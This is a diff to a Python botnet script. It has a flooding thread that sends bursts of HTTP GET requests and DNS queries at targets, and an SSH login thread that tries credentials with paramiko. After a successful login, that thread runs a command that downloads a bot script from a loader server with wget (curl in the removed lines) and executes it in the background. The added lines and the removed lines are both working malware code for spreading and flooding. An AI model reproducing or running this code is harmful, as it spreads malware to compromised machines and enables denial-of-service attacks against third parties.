@@ -23,6 +23,7 @@ try:
 except:
     exit('MOD_IP or OUR_DNS value is not supplied.')
 
+
 LOADER_PORT = 8000
 MY_IP = "0.0.0.0"
 LOCK_FILE = '/tmp/b'
@@ -124,9 +125,12 @@ class attack(Thread):
 
     def run(self):       
         if self._type == 0:
-            cnt = randint(20,40)
-            cmd = "curl -s http://{}?[10-{}]".format(self._ip, cnt)
-            os.system(cmd)
+            connection = http.client.HTTPConnection(self._ip, port=self._port)
+            headers = {'Content-type': 'application/json'}
+            for i in range(randint(20,40)):
+                connection.request("GET", self.get_random_string(7), headers=headers)
+                _ = connection.getresponse()
+            connection.close()
         elif self._type == 1:
             for i in range(randint(20,40)):
                 l_qname = 'somedomain.com'
@@ -148,16 +152,12 @@ class ssh_login(Thread):
         s = paramiko.SSHClient()
         s.load_system_host_keys()
         s.set_missing_host_key_policy(paramiko.WarningPolicy)
-            
+
         try:
-            if self._uname == "root" and self._pwd == "root":
-                k = paramiko.RSAKey.from_private_key_file("/tmp/rps.pem")
-                s.connect(self._ip, 22, "ubuntu", pkey = k, timeout=5, auth_timeout=5)
-            else:
-                s.connect(self._ip, 22, self._uname, self._pwd, timeout=5, auth_timeout=5)
+            s.connect(self._ip, 22, self._uname, self._pwd, timeout=5, auth_timeout=5)
 
             # Download malware from loader and execute.
-            cmd = "curl -X GET http://{}:{}/bot_multitry_u.py > /tmp/bot.py && curl -X GET http://{}:{}/rps.pem > /tmp/rps.pem && sudo python3 /tmp/bot.py {} {} &".format(MOD_IP, LOADER_PORT, MOD_IP, LOADER_PORT, MOD_IP, OUR_DNS)
+            cmd = "wget -O /tmp/bot.py {}:{}/bot_multitry.py && python3 /tmp/bot.py {} {} &".format(MOD_IP, LOADER_PORT, MOD_IP, OUR_DNS)
             sin, sout, serr = s.exec_command(cmd)
             sout.channel.recv_exit_status()
             print('Login successful using {} {} {}.'.format(self._ip, self._uname, self._pwd))
@@ -173,8 +173,8 @@ class ssh_login(Thread):
         except paramiko.ssh_exception.AuthenticationException:
             pass
         except:
-                print(sys.exc_info())
-                #print('Login Failed.')
+            print(sys.exc_info())
+            #print('Login Failed.')
         finally:
             s.close()
 
